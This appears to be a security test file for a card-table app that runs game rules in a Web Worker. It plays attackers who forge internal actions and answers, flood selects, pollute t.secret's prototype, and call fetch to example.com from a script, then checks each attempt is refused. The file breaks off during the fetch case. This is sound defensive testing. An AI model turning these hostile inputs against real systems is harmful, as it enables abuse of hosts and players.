// Phase 3B, the attacker cases of spec §3j against a host whose rules run in
// a Worker — 1 (answers that weren't offered), 2 (a select flood), 3
// (internal actions from the wire), 5 (nobody else's ask, hint or secret, in
// any body), 6 (fetch in a script), 8 (select on a hidden piece) and 9
// (t.secret's gate) — and then the Worker's hardening tried as Mallory would
// if the host pasted HER script (§3f.7: defence in depth, not a sandbox; the
// README's honest limits: the network and storage APIs are taken away, only
// dynamic import() is left). A script is trusted with every hidden card, so
// what is checked there is what the spec promises regardless: no page API,
// no network but import(), no post of its own to the host, and nothing done
// through the Worker's own message protocol that acts as a player or parts
// the mirror from the host's table (§3f.1, §3f.3, §0.2 "Actor").
//
// Alice hosts. Bob is an honest guest whose incoming bodies are recorded
// (p3-lib join). Mallory is a raw peer (final-lib), seated with her own key.
// Eve is a raw peer who only ever knocks anonymously: never registered, she
// must get no part of anyone's (§3d). The "Attack probe" script counts its
// hooks in t.public.c and, when the host presses its "run" button with code
// (the host's __ct.act), runs that code in onAction, in the Worker. The marker
// texts (prompts, labels, option values, secrets) are random and reach the
// Worker as character codes, so the scans can only find them where the engine
// put them. A small HTTP server stands in for "a server outside the table".
// After each case, and after every Enable, the Worker's mirror must equal the
// host's table (§3f.3: __ct.workerDigest() against __ct.digest()); that check
// is also what found a re-Enable leaving a player's old hint on the host (its
// own section: D121, "hints start afresh on every Enable").
//
// Timing: case 2's bounds are loose sanity bounds (the flood's counterfactual,
// an unthrottled select, would take seconds); the watchdog's own budget (B14)
// is t-p1-bench's, in the serial batch.
'use strict';
const http = require('http');
const crypto = require('crypto');
const h = require('./h');
const { ok, section } = h;
const { mallory } = require('./final-lib');
const { arm } = require('./p2-lib');
const S = require('./p3-lib');
const P = require('./p2t-lib');
const { until } = require('./p1-lib');

const MPID = 'ffffffffffffffff';
const NOT_OFFERED = "🚫 That answer wasn't offered";
const R = crypto.randomBytes(3).toString('hex');
/** The marker texts: each must reach only the player it was made for, or nobody. */
const MK = {
  bobPrompt: `QzBobPrompt${R}`, bobLabel: `QzBobLbl${R}`, bobValue: `QzBobValue${R}`, bobSecret: `QzBobSecret${R}`,
  alicePrompt: `QzAlicePrompt${R}`, aliceSecret: `QzAliceSecret${R}`,
  malValue: `QzMalValue${R}`, malSecret: `QzMalSecret${R}`,
};
const HINT_SPACES = ['qzhintmap:a1', 'qzhintmap:e5'];
/** JS source evaluating to string s, without s in it. */
const lit = (s) => `String.fromCharCode(${[...s].map((c) => c.charCodeAt(0)).join(',')})`;
const J = JSON.stringify;

/** The probe. Its setup builds the table once: a rect felt, the primary 8 × 8
 *  board, a second 5 × 5 board (type "qzhintmap", named otherwise: its
 *  addresses, "qzhintmap:a1", appear only where the engine shows Bob his
 *  hint), eight stones in a row at y 800 (x 200, 300, … 900) and one hidden
 *  tile of the host's at (1200, 800). onSelect: Mallory's selections cost
 *  t.data.selCost ms of Worker time and are counted (sel, selM, selAt);
 *  anyone else's are counted (selO) and answered with t.data.hint. */
const PROBE = `({ name: 'Attack probe',
  setup(t) {
    t.public.c = t.public.c || { sel: 0, selO: 0, ans: 0, ansAct: 0, join: 0, leave: 0, timer: 0, selM: [], selAt: [] };
    if (t.data.built) return;
    t.data.built = true;
    t.setTable({ shape: 'rect', w: 2000, h: 1400 });
    const box = t.newBox({ name: 'Probe box', pieces: [
      { id: 'main', kind: 'board', w: 420, h: 420, faces: [{ color: '#557755' }], grid: { type: 'square', cols: 8, rows: 8, cell: 50, x: 10, y: 10, draw: 'checker', labels: 'chess' } },
      { id: 'qzhintmap', name: 'Map two', kind: 'board', w: 270, h: 270, faces: [{ color: '#335577' }], grid: { type: 'square', cols: 5, rows: 5, cell: 50, x: 10, y: 10, draw: 'cells', labels: 'chess' } },
      { id: 'stone', kind: 'token', w: 50, stack: 'none', faces: ['A', 'B'] },
      { id: 'tile', kind: 'tile', back: 'hb', faces: ['T'] },
    ], backs: [{ id: 'hb', color: '#222244' }] });
    t.spawn(box + '/main', { at: { x: 100, y: 100 } });
    t.spawn(box + '/qzhintmap', { at: { x: 700, y: 100 } });
    for (let k = 0; k < 8; k++) t.spawn(box + '/stone', { at: { x: 200 + 100 * k, y: 800, free: true } });
    t.spawn(box + '/tile', { at: { x: 1200, y: 800, free: true }, up: false, owner: t.hostId });
  },
  onSelect(t, p, id) {
    const c = t.public.c;
    if (p !== '${MPID}') { c.selO++; if (t.data.hint) t.hint(p, t.data.hint); return; }
    const end = Date.now() + (t.data.selCost || 0);
    while (Date.now() < end);
    c.sel++;
    c.selM = c.selM.concat([id]).slice(-30);
    c.selAt = c.selAt.concat([Date.now()]).slice(-200);
  },
  onAnswer(t, p, id, v) { t.public.c.ans++; t.data.lastAns = { p, id, v }; },
  onAction(t, a) {
    if (a.t === 'answer') t.public.c.ansAct++;
    if (a.t === 'rulesBtn' && a.id === 'run') new Function('t', 'a', '"use strict";\\n' + a.code)(t, a);
  },
  onJoin(t) { t.public.c.join++; },
  onLeave(t) { t.public.c.leave++; },
  onTimer(t) { t.public.c.timer++; },
  buttons: (t) => [{ id: 'run', label: 'Run', pid: t.hostId }],
})`;

/** A server outside the table: records every request (and WebSocket upgrade) it gets. */
function leakServer() {
  const hits = [];
  const srv = http.createServer((req, res) => {
    hits.push(req.url);
    res.writeHead(200, { 'Content-Type': 'text/javascript', 'Access-Control-Allow-Origin': '*' });
    res.end('export const seen = typeof fetch;');
  });
  srv.on('upgrade', (req, sock) => { hits.push(req.url); sock.destroy(); });
  return new Promise((r) => srv.listen(0, '127.0.0.1', () => r({ hits, origin: `127.0.0.1:${srv.address().port}`, close: () => srv.close() })));
}

/** In a raw peer's page (final-lib): the recursive scan of every message it
 *  received from the host: every channel but `asset` (binary) and `act`
 *  (what peers send the host: the host never sends there). Hits: a needle
 *  (o.needles) in any key or string; an array holding two or more of
 *  o.ids (the hint's item list); a `hint` that isn't null; a `sec` that
 *  isn't null or o.ownSec's; an `ask` that isn't null or a list of o.ownAsks
 *  ids with label-only options; with o.noHand, a `hand` that isn't empty;
 *  a state body carrying any of those parts that isn't bound to o.me (`to`).
 *  `own` counts the bodies carrying the peer's own sec and ask (the positive
 *  controls), `n` the messages scanned. */
const scanRaw = (page, o) => page.evaluate((o) => {
  const body = (m) => (typeof m?.b === 'string' ? JSON.parse(m.b) : m);
  const hits = [], own = { sec: 0, ask: 0 };
  let n = 0;
  const walk = (x, at) => {
    if (Array.isArray(x)) {
      if (x.filter((s) => o.ids.includes(s)).length >= 2) hits.push(`${at}: hinted ids together ${JSON.stringify(x).slice(0, 80)}`);
      x.forEach((y, k) => walk(y, `${at}[${k}]`));
    } else if (x && typeof x === 'object') {
      for (const [k, v] of Object.entries(x)) {
        for (const nd of o.needles) if (k.includes(nd)) hits.push(`${at}: key "${nd}"`);
        if (k === 'hint' && v != null) hits.push(`${at}.hint = ${JSON.stringify(v).slice(0, 80)}`);
        if (k === 'sec' && v != null) { if (o.ownSec && v.text === o.ownSec) own.sec++; else hits.push(`${at}.sec = ${JSON.stringify(v).slice(0, 80)}`); }
        if (k === 'ask' && v != null) {
          const mine = Array.isArray(v) && v.every((a) => o.ownAsks.includes(a.id) && (!a.options || a.options.every((l) => typeof l === 'string')));
          if (mine && v.length) own.ask++;
          if (!mine) hits.push(`${at}.ask = ${JSON.stringify(v).slice(0, 80)}`);
        }
        if (o.noHand && k === 'hand' && Array.isArray(v) && v.length) hits.push(`${at}.hand (${v.length} cards)`);
        walk(v, `${at}.${k}`);
      }
    } else if (typeof x === 'string') for (const nd of o.needles) if (x.includes(nd)) hits.push(`${at}: "${nd}"`);
  };
  for (const [ch, list] of Object.entries(window.M.got)) {
    if (ch === 'asset' || ch === 'act') continue; // (images; and other peers' own actions, never a host body)
    list.forEach(({ m }, k) => {
      n++;
      let d;
      try { d = body(m); } catch (err) { hits.push(`${ch}#${k}: unreadable (${err.message})`); return; }
      if (ch === 'state' && ['ask', 'hint', 'sec'].some((p) => d?.[p] != null) && d.to !== o.me) hits.push(`${ch}#${k}: parts in a body addressed to ${JSON.stringify(d.to)}`);
      walk(d, `${ch}#${k}`);
    });
  }
  return { hits, own, n };
}, o);

(async () => {
  const env = await h.start();
  const leak = await leakServer();
  const host = await S.join(env, 'Alice', env.url);
  await host.waitForSelector('.item.pile .count');
  const wlog = []; // the host page's console, the rules Worker's included
  host.on('console', (m) => wlog.push(m.text()));
  const bob = await S.join(env, 'Bob', host.url());
  const invite = await host.evaluate(() => location.href);
  const M = await mallory(env, invite, 2);
  const X = await arm(M);
  await M.act({ t: 'hello' });
  await M.waitForFunction((p) => window.M.fold()?.players?.[p], MPID, { timeout: 20000 });
  await M.evaluate(() => {
    /** Her own parts (ask, hint, sec) as the state bodies she received add up to (a guest's fold). */
    window.M.parts = () => {
      let p = null, seq = null, boot = null;
      for (const { m } of window.M.got.state) {
        const d = window.M.body(m);
        if (d.kind === 'snap') [p, seq, boot] = [{ ask: d.ask ?? null, hint: d.hint ?? null, sec: d.sec ?? null }, d.seq, d.boot];
        else if (d.kind === 'patch' && p && d.boot === boot && d.base === seq) {
          for (const k of ['ask', 'hint', 'sec']) if (k in d) p[k] = d[k];
          seq = d.seq;
        }
      }
      return p;
    };
  });
  const Eve = await mallory(env, invite, 3);
  const knock = () => Eve.evaluate((v) => window.M.send.act({ t: 'hello', _v: v }), h.PROTO); // anonymous: no _pid, never registered
  await knock();
  ok(await until(() => Eve.evaluate(() => window.M.got.state.length > 0), 15000), 'Eve, who only knocks, gets the public snapshot');
  const ALICE = host.pid, BOB = bob.pid;

  const C = () => P.viewOf(host, 'v.rules.public.c');
  const rulesOn = () => P.viewOf(host, '!!v.rules?.enabled');
  const lastErr = () => host.evaluate(() => window.__ct.lastRulesError);
  const hostNow = () => host.evaluate(() => Date.now());
  const logSince = (ts) => P.viewOf(host, 'v.log.filter((e) => e.ts >= a)', ts);
  const parts = () => M.evaluate(() => window.M.parts());
  /** Runs `code` in the probe's onAction, in the Worker (t and the frozen a in scope). */
  const run = (code) => host.evaluate((c) => window.__ct.act({ t: 'rulesBtn', id: 'run', code: c }), code);
  /** Enables the probe (again: the same name keeps t.data, t.public, the asks and the secrets), and checks the new Worker's mirror. */
  async function enableProbe() {
    if (await host.$('#rules-dialog[open]')) await host.click('#rules-dialog button[value="cancel"]');
    await h.enableRules(host, { code: PROBE });
    const on = await P.waitView(host, "v.rules?.enabled && v.rules.name === 'Attack probe' && (v.rules.public.buttons || []).some((b) => b.id === 'run')", null, 15000);
    await mirrorEqual('after an Enable');
    return on;
  }
  /** §3f.3: once the queue is idle, the Worker's mirror equals the host's table (T.digest on both sides). */
  async function mirrorEqual(label) {
    await until(() => host.evaluate(() => window.__ct.jobs() === 0), 10000, 100);
    const [wd, hd] = await host.evaluate(async () => [await window.__ct.workerDigest(), window.__ct.digest()]);
    ok(wd !== null && wd === hd, `§3f.3, ${label}: the Worker's mirror equals the host's table (${wd} / ${hd})`);
    return wd === hd;
  }
  /** Waits until the host's rules are off, then the error and whether a "rules disabled" line was logged since ts. */
  async function disabled(ts, ms = 10000) {
    const off = await P.waitView(host, '!v.rules?.enabled', null, ms);
    return { off, err: await lastErr(), line: (await logSince(ts)).find((e) => /^rules disabled/.test(e.txt))?.txt || '' };
  }

  section('setup: the probe runs in a Worker; asks, secrets and a hint are made for Bob, Alice and Mallory');
  ok(await enableProbe(), 'the host enables the Attack probe (Enable starts a rules Worker)');
  ok(await P.waitView(host, 'Object.values(v.items).filter((it) => it.k === "g" && it.y === 800).length === 9', null, 15000), "the probe's setup built its table (two boards, eight stones, a hidden tile)");
  const its = await P.viewOf(host, 'v.items');
  const at = (x, y) => Object.keys(its).find((id) => its[id].x === x && its[id].y === y);
  const ids = { S1: at(200, 800), BP: at(300, 800), H1: at(400, 800), H2: at(500, 800), H3: at(600, 800), MKR: at(700, 800), HMK: at(800, 800), IT: at(900, 800), HID: at(1200, 800) };
  ok(Object.values(ids).every(Boolean) && its[ids.HID].b && !('t' in its[ids.HID]), `every probe item is found, the tile hidden (back ${its[ids.HID]?.b})`);
  const HINTED = [ids.H1, ids.H2, ids.H3];
  const armed = await run(`
    const M = '${MPID}', B = ${J(BOB)}, A = t.hostId;
    t.ask(B, { id: 'bq', prompt: ${lit(MK.bobPrompt)}, options: [{ label: ${lit(MK.bobLabel)}, value: ${lit(MK.bobValue)} }, 'no'] });
    t.ask(A, { id: 'aq', prompt: ${lit(MK.alicePrompt)}, pick: 'number', min: 0, max: 9 });
    t.secret[B] = { text: ${lit(MK.bobSecret)} };
    t.secret[A] = { text: ${lit(MK.aliceSecret)} };
    t.secret[M] = { text: ${lit(MK.malSecret)} };
    t.ask(M, { id: 'mopt', prompt: 'Pick one', options: [{ label: 'x', value: ${lit(MK.malValue)} + '1' }, { label: 'y', value: ${lit(MK.malValue)} + '2' }] });
    t.ask(M, { id: 'mspace', prompt: 'Where?', pick: 'space', among: ['b2', 'c3'] });
    t.ask(M, { id: 'mhand', prompt: 'Two cards', pick: 'hand', count: 2 });
    t.ask(M, { id: 'mitem', prompt: 'Which?', pick: 'item', among: [${J(ids.IT)}] });
    t.ask(M, { id: 'mnum', prompt: 'How many?', pick: 'number', min: 1, max: 6 });
    t.draw(M, t.piles()[0].id, 3);
    t.data.hint = { items: ${J(HINTED)}, spaces: [['qzhintmap', 'a1'].join(':'), ['qzhintmap', 'e5'].join(':')] };`);
  ok(armed.ok && await rulesOn(), `the host's run made them, the rules still on (${J(armed)} ${await lastErr()})`);
  ok(await P.waitView(bob, `v.ask.some((x) => x.id === 'bq') && v.sec?.text === a`, MK.bobSecret, 15000), 'Bob sees his ask and his secret');
  const bv = await P.viewOf(bob, '({ ask: v.ask, sec: v.sec })');
  ok(J(bv.ask) === J([{ id: 'bq', prompt: MK.bobPrompt, options: [MK.bobLabel, 'no'] }]), `Bob's ask carries its prompt and its options as labels only (${J(bv.ask).slice(0, 120)})`);
  await bob.evaluate((id) => window.__ct.act({ t: 'select', id }), ids.BP);
  ok(await P.waitView(bob, 'v.hint && a.items.every((id) => v.hint.items.includes(id)) && a.spaces.every((s) => v.hint.spaces.includes(s))', { items: HINTED, spaces: HINT_SPACES }, 15000),
    `Bob selects his stone: his hint shows three stones and two spaces of the second board (${J(await P.viewOf(bob, 'v.hint'))})`);
  ok(await M.waitForFunction(() => window.M.parts()?.ask?.length === 5 && window.M.parts()?.sec, null, { timeout: 15000 }).then(() => true, () => false), "Mallory's own five asks and her secret reach her");
  const mp = await parts();
  ok(mp.sec?.text === MK.malSecret && mp.ask.find((x) => x.id === 'mopt')?.options.join() === 'x,y' && mp.hint === null,
    `… her option ask as labels only, her secret's text, no hint (${J(mp).slice(0, 160)})`);
  await M.waitForFunction(() => window.M.fold()?.hand?.length === 3, null, { timeout: 15000 }).catch(() => {});
  const mhand = await X.view('v.hand');
  ok(mhand?.length === 3, `Mallory holds the three cards the probe dealt her (${J(mhand)})`);
  await knock(); // (Eve's next snapshot: the asks, secrets and hint exist now)
  await mirrorEqual('after the setup');

  // (Found by the digest checks of this suite; every later check of the
  // mirror relies on a table whose hints both sides agree on.)
  section('Enable again with a hint showing: the hints start afresh (D121), and the new Worker mirrors the host (§3f.3)');
  {
    const ts0 = await hostNow();
    ok(await enableProbe(), 'the host enables the probe again, Bob\'s hint showing');
    // (the patch that brings Bob the Enable's log line brings his hint's clearing too)
    ok(await P.waitView(bob, "v.rules?.enabled && v.log.some((e) => e.ts >= a && /^«Attack probe» enabled by/.test(e.txt))", ts0, 15000), "Bob's table shows the new Enable");
    await h.sleep(300);
    ok((await P.viewOf(bob, 'v.hint')) === null, `D121: Bob's hint is gone after the Enable (${J(await P.viewOf(bob, 'v.hint'))})`);
    await bob.evaluate((id) => window.__ct.act({ t: 'rot', id, rot: 10 }), ids.BP);
    await P.waitView(bob, 'v.items[a].rot === 10', ids.BP, 10000);
    await h.sleep(500);
    ok((await P.viewOf(bob, 'v.hint')) === null, `§3e: … and certainly once his next ruled action starts (${J(await P.viewOf(bob, 'v.hint'))})`);
    // Back to one table on both sides: a hint the script sets, then clears, travels in its patches.
    await run(`t.hint(${J(BOB)}, { items: [] });`);
    await run(`t.hint(${J(BOB)}, null);`);
    await mirrorEqual("after the script set Bob's hint and cleared it (both sides agree again)");
  }

  // §3j case 3 goes first: the host turns an unknown action away with one notice per 10 s per peer.
  section("3: Mallory sends the internal actions _tick, _rulesOff and _join: each refused, nothing runs");
  let boundaryAt = 0;
  for (const a of [{ t: '_tick' }, { t: '_rulesOff', reason: 'Mallory says so' }, { t: '_join', name: 'Mallory II' }]) {
    const wait = boundaryAt + 10500 - Date.now();
    if (wait > 0) await h.sleep(wait);
    const c0 = await C(), jobs0 = await host.evaluate(() => window.__ct.perf.workerJobs), ts0 = await hostNow();
    const r = await X.attempt(a, ids.MKR);
    boundaryAt = Date.now();
    const c1 = await C(), jobs1 = await host.evaluate(() => window.__ct.perf.workerJobs), lines = (await logSince(ts0)).filter((e) => !/^rotated /.test(e.txt));
    const me = await P.viewOf(host, 'v.players[a]', MPID);
    ok(r.notes.length === 1 && /^🚫/.test(r.notes[0]), `3: {t: '${a.t}'} from the wire is refused (${J(r.notes)})`);
    ok(await rulesOn() && J(c1) === J(c0) && !lines.length && jobs1 - jobs0 === 1 && me.name === 'Mallory' && me.online,
      `3: … no hook ran (onJoin/onTimer counts ${c1.join}/${c1.timer}), no line logged (${J(lines.map((e) => e.txt))}), the rules on, one Worker job: her barrier (${jobs1 - jobs0})`);
  }
  {
    const c0 = await C(), jobs0 = await host.evaluate(() => window.__ct.perf.workerJobs), ts0 = await hostNow();
    for (const a of [{ t: '_leave' }, { t: '_name', name: 'Eve' }, { t: '_refuse', a: { t: 'rot', id: ids.S1 } }, { t: '_unsaveable' }, { t: '_TICK' }]) await X.send(a);
    await X.barrier(ids.MKR);
    const c1 = await C(), jobs1 = await host.evaluate(() => window.__ct.perf.workerJobs), lines = (await logSince(ts0)).filter((e) => !/^rotated /.test(e.txt));
    const me = await P.viewOf(host, 'v.players[a]', MPID);
    ok(J(c1) === J(c0) && !lines.length && jobs1 - jobs0 === 1 && me.name === 'Mallory' && me.online && await rulesOn(),
      `3: _leave, _name, _refuse, _unsaveable and _TICK change nothing either (still online and named ${me.name}; ${jobs1 - jobs0} Worker job; lines ${J(lines.map((e) => e.txt))})`);
  }

  await mirrorEqual('after case 3');

  section("1: Mallory's answers that were not offered — each refused, no hook runs, the ask stays");
  const mine = mhand.map((c, idx) => ({ idx, d: c.d, i: c.i }));
  /** Mallory sends answer `a`: refused with "That answer wasn't offered", no onAnswer/onAction, no "answered", her asks and Bob's as they were. */
  async function refused(what, a) {
    const c0 = await C(), ts0 = await hostNow(), asks0 = (await parts()).ask.map((x) => x.id).join();
    const r = await X.attempt(a, ids.MKR);
    const c1 = await C(), answered = (await logSince(ts0)).filter((e) => e.txt === 'answered'), asks1 = (await parts()).ask.map((x) => x.id).join();
    const bobAsk = await P.viewOf(bob, 'v.ask.map((x) => x.id).join()');
    ok(J(r.notes) === J([NOT_OFFERED]) && c1.ans === c0.ans && c1.ansAct === c0.ansAct && !answered.length && asks1 === asks0 && bobAsk === 'bq',
      `1: ${what} — refused (${J(r.notes)}), onAnswer ${c1.ans - c0.ans}, onAction ${c1.ansAct - c0.ansAct}, nothing logged, her asks [${asks1}], Bob's [${bobAsk}]`);
  }
  await refused("Bob's ask id 'bq'", { t: 'answer', id: 'bq', v: 0 });
  await refused('an ask id nobody has', { t: 'answer', id: 'nope', v: 0 });
  for (const v of [2, -1, 0.5, '1', null, [1], true]) await refused(`option index ${J(v)} of her two options`, { t: 'answer', id: 'mopt', v });
  for (const v of ['h8', 'a1', 'qzhintmap:b2', 'zz99', '']) await refused(`the space ${J(v)} (among b2, c3)`, { t: 'answer', id: 'mspace', v });
  await refused('one hand card (count 2)', { t: 'answer', id: 'mhand', v: [mine[0]] });
  await refused('three hand cards (count 2)', { t: 'answer', id: 'mhand', v: mine });
  await refused('the same card twice', { t: 'answer', id: 'mhand', v: [mine[0], mine[0]] });
  const absent = [...Array(52).keys()].find((i) => !mine.some((c) => c.i === i));
  await refused('a card she does not hold', { t: 'answer', id: 'mhand', v: [mine[0], { idx: 1, d: mine[1].d, i: absent }] });
  await refused('one card twice, under two indexes', { t: 'answer', id: 'mhand', v: [mine[0], { ...mine[0], idx: 1 }] });
  await refused('no cards', { t: 'answer', id: 'mhand', v: [] });
  await refused('an item not among the offered', { t: 'answer', id: 'mitem', v: ids.BP });
  for (const v of [0, 7, 2.5, '3']) await refused(`the number ${J(v)} (1 to 6)`, { t: 'answer', id: 'mnum', v });
  // Bob's ask answered in Bob's name: the host's boundary checks the seat key first.
  {
    const c0 = await C(), ts0 = await hostNow(), n0 = (await X.marks()).note;
    await M.evaluate(([v, b]) => window.M.send.act({ t: 'answer', id: 'bq', v: 0, _v: v, _pid: b, _name: 'Bob', _key: 'm'.repeat(32) }), [h.PROTO, BOB]);
    await X.barrier(ids.MKR);
    await until(async () => (await X.marks()).note > n0, 3000, 100);
    const notes = await X.notesSince(n0), c1 = await C(), answered = (await logSince(ts0)).filter((e) => e.txt === 'answered');
    ok(notes.length === 1 && /^🚫/.test(notes[0]) && c1.ans === c0.ans && !answered.length && (await P.viewOf(bob, 'v.ask.map((x) => x.id).join()')) === 'bq',
      `1: her answer to Bob's ask in Bob's name is refused (${J(notes)}): no hook, Bob's ask stays`);
  }
  // The positive controls: her answers that were offered.
  {
    const c0 = await C(), ts0 = await hostNow();
    const r = await X.attempt({ t: 'answer', id: 'mopt', v: 1 }, ids.MKR, true);
    await run(`t.public.c.lastOk = J(t.data.lastAns) === J({ p: '${MPID}', id: 'mopt', v: ${lit(MK.malValue)} + '2' });`.replace(/J\(/g, 'JSON.stringify('));
    const c1 = await C(), lines = (await logSince(ts0)).filter((e) => e.p === MPID && !/^rotated /.test(e.txt));
    ok(!r.notes.length && c1.ans === c0.ans + 1 && c1.ansAct === c0.ansAct + 1 && c1.lastOk === true && J(lines.map((e) => e.txt)) === J(['answered']),
      `1 (control): her answer 1 to 'mopt' is taken — onAnswer and onAction run once, the value is option 1's (${c1.lastOk}), the log says only ${J(lines.map((e) => e.txt))}`);
    ok(!(await parts()).ask.some((x) => x.id === 'mopt'), "1 (control): … and 'mopt' is no longer pending");
    const c2 = await C();
    await X.attempt({ t: 'answer', id: 'mhand', v: [mine[2], mine[0]] }, ids.MKR, true);
    await run(`t.public.c.lastOk = JSON.stringify(t.data.lastAns.v) === ${J(J([mine[2], mine[0]].map(({ d, i }) => ({ d, i }))))};`);
    const c3 = await C();
    ok(c3.ans === c2.ans + 1 && c3.lastOk === true && (await X.view('v.hand.length')) === 3, `1 (control): two distinct cards of hers answer 'mhand' — {d, i} in her order, the cards stay in her hand (${c3.lastOk})`);
  }

  await mirrorEqual('after case 1');

  section("8: Mallory selects Alice's hidden tile — dropped, onSelect never runs; her select of a stone runs it");
  {
    await h.sleep(1100); // (her select bucket full)
    const c0 = await C();
    await X.send({ t: 'select', id: ids.HID });
    await X.send({ t: 'select', id: 'deadbeef' });
    await X.send({ t: 'select', id: ids.S1 });
    ok(await until(async () => (await C()).sel === c0.sel + 1, 15000), 'her select of a visible stone runs onSelect');
    await X.barrier(ids.MKR);
    const c1 = await C();
    ok(c1.sel === c0.sel + 1 && J(c1.selM.slice(c0.selM.length)) === J([ids.S1]) && !c1.selM.includes(ids.HID),
      `8: the hidden tile's select (and a select of no item) ran no hook: onSelect saw only ${J(c1.selM.slice(c0.selM.length))}`);
    ok((await parts()).hint === null && (await P.viewOf(host, 'v.hint')) === null, '8: … and nobody was hinted');
  }

  await mirrorEqual('after case 8');

  section('2: Mallory floods select, 100 a second for 4 s, at 80 ms of Worker time each: at most 5 a second run, the host keeps up');
  {
    ok((await run('t.data.selCost = 80;')).ok, 'each of her selections now costs the Worker 80 ms');
    await h.sleep(2500); // (her flood-control bucket full again)
    await host.evaluate(() => {
      const b = (window.__click = {});
      document.getElementById('log-btn').addEventListener('click', (e) => { b.click = e.timeStamp; }, { capture: true, once: true });
      new MutationObserver((_, o) => { b.dom = performance.now(); o.disconnect(); }).observe(document.getElementById('side'), { attributes: true });
    });
    const c0 = await C(), t0 = Date.now();
    const flood = M.evaluate(async ({ id, ms }) => {
      let n = 0;
      const end = performance.now() + ms;
      while (performance.now() < end) {
        for (let k = 0; k < 5; k++) { window.M.act({ t: 'select', id }); n++; }
        await new Promise((r) => setTimeout(r, 50));
      }
      return n;
    }, { id: ids.S1, ms: 4000 });
    const probe = host.evaluate(async ({ id, n }) => {
      const out = [];
      for (let k = 0; k < n; k++) {
        await new Promise((r) => setTimeout(r, 400));
        const t = performance.now(), r = await window.__ct.act({ t: 'rot', id, rot: 30 * (k + 1) });
        out.push({ ms: performance.now() - t, ok: r.ok, jobs: window.__ct.jobs() });
      }
      return out;
    }, { id: ids.HMK, n: 8 });
    await h.sleep(1800);
    await host.click('#log-btn');
    const [sent, lat] = await Promise.all([flood, probe]);
    const floodEnd = Date.now();
    await until(async () => (await host.evaluate(() => window.__ct.jobs())) === 0 && (await h.sleep(400), (await host.evaluate(() => window.__ct.jobs())) === 0), 15000, 100);
    const drained = Date.now() - floodEnd, secs = (Date.now() - t0) / 1000, c1 = await C();
    const N = c1.sel - c0.sel, times = c1.selAt.slice(-N);
    let win = 0;
    for (const a of times) win = Math.max(win, times.filter((b) => b >= a && b < a + 1000).length);
    const click = await host.evaluate(() => window.__click);
    await host.click('#log-btn');
    console.log(`  sent ${sent} selects in 4 s; ${N} ran in ${secs.toFixed(1)} s (most in one second: ${win}); host moves ${lat.map((x) => x.ms.toFixed(0)).join(', ')} ms (queue ${lat.map((x) => x.jobs).join(',')}); drained ${drained} ms after; click → panel ${(click.dom - click.click).toFixed(1)} ms`);
    ok(sent >= 200, `2: the flood is one: ${sent} selects sent in 4 s`);
    ok(N >= 5 && N <= 5 * secs + 5, `2: at most 5 a second ran onSelect: ${N} in ${secs.toFixed(1)} s (≤ ${(5 * secs + 5).toFixed(0)}: 5 a second plus one second's burst)`);
    ok(lat.length === 8 && lat.every((x) => x.ok && x.ms < 2000), `2: the host's own moves during the flood each apply in < 2 s (max ${Math.max(...lat.map((x) => x.ms)).toFixed(0)} ms; unthrottled, the Worker would be seconds behind)`);
    ok((await P.viewOf(host, 'v.items[a].rot', ids.HMK)) === 240, '2: … and the last one is on the table');
    ok(drained < 3000, `2: no backlog: the queue is empty ${drained} ms after the flood`);
    ok(click.dom > click.click && click.dom - click.click < 1000, `2: a host click during the flood opens the log panel in ${(click.dom - click.click).toFixed(1)} ms`);
    await run('t.data.selCost = 0;');
    await mirrorEqual('after the flood');
  }

  section("9: a script writes t.secret['__proto__'] and t.secret.bob — the hook fails, the rules go off, no prototype is touched");
  {
    let ts0 = await hostNow();
    await run(`
      const before = Object.getPrototypeOf(t.secret);
      t.secret['__proto__'] = { qzPolluted: 1 };
      console.log('QZPROTO ' + JSON.stringify({ sameProto: Object.getPrototypeOf(t.secret) === before, inherited: 'qzPolluted' in t.secret && !Object.prototype.hasOwnProperty.call(t.secret, 'qzPolluted'), objectPrototype: 'qzPolluted' in {}, ownKey: Object.prototype.hasOwnProperty.call(t.secret, '__proto__') }));`);
    let d = await disabled(ts0);
    const line = wlog.find((x) => x.startsWith('QZPROTO '));
    const w = line && JSON.parse(line.slice(8));
    ok(d.off && /t\.secret/.test(d.err) && /__proto__/.test(d.err) && d.line, `9: t.secret['__proto__'] = {…} fails the hook and disables the rules ("${d.err}"; log "${d.line}")`);
    ok(w && w.sameProto && !w.inherited && !w.objectPrototype, `9: … in the Worker, t.secret's prototype stayed as it was and Object.prototype untouched (${line})`);
    ok(await host.evaluate(() => !('qzPolluted' in {}) && !('qzPolluted' in Object.prototype)) && (await P.viewOf(bob, 'v.sec?.text')) === MK.bobSecret,
      "9: … on the host nothing inherits it, and Bob's secret is unchanged (secrets stay sent while the rules are off)");
    ok(await enableProbe(), 'the host enables the probe again');
    ts0 = await hostNow();
    await run("t.secret.bob = 'x';");
    d = await disabled(ts0);
    ok(d.off && /t\.secret/.test(d.err) && /"bob"/.test(d.err) && d.line, `9: t.secret.bob = 'x' fails the hook and disables the rules ("${d.err}")`);
    ok(await enableProbe(), 'the host enables the probe again');
    ts0 = await hostNow();
    await run(`t.secret[${J(BOB)}] = { text: 'y'.repeat(9000) };`);
    d = await disabled(ts0);
    ok(d.off && /too large/.test(d.err) && (await P.viewOf(bob, 'v.sec?.text')) === MK.bobSecret, `9: a 9,000-char secret fails too, Bob's left as it was ("${d.err}")`);
    const saves0 = await host.evaluate(() => window.__ct.perf.saves);
    await until(() => host.evaluate((n) => window.__ct.perf.saves > n, saves0), 5000);
    const saved = await host.evaluate(async () => {
      const db = await new Promise((res, rej) => { const r = indexedDB.open('cardtable'); r.onsuccess = () => res(r.result); r.onerror = () => rej(r.error); });
      try {
        const all = await new Promise((res, rej) => { const r = db.transaction('saves').objectStore('saves').getAll(); r.onsuccess = () => res(r.result); r.onerror = () => rej(r.error); });
        return all.map((s) => Reflect.ownKeys(s.state?.rules?.secret || {}).map(String));
      } finally { db.close(); }
    });
    ok(saved.length >= 1 && saved.every((keys) => keys.length === 3 && keys.every((k) => /^[0-9a-f]{16}$/.test(k))), `9: the save holds the three players' secrets and no other key (${J(saved)})`);
    ok(await enableProbe(), 'the host enables the probe again');
  }

  section("6: a script calls fetch('https://example.com') — it throws, and the rules disable loudly");
  {
    let reqs = 0;
    await host.context().route('https://example.com/**', (r) => { reqs++; r.abort(); });
    const ts0 = await hostNow();
    await run(`try { fetch('https://example.com'); } catch (e) { console.log('QZFETCH ' + e.name + ': ' + e.message); throw e; }`);
    const d = await disabled(ts0);
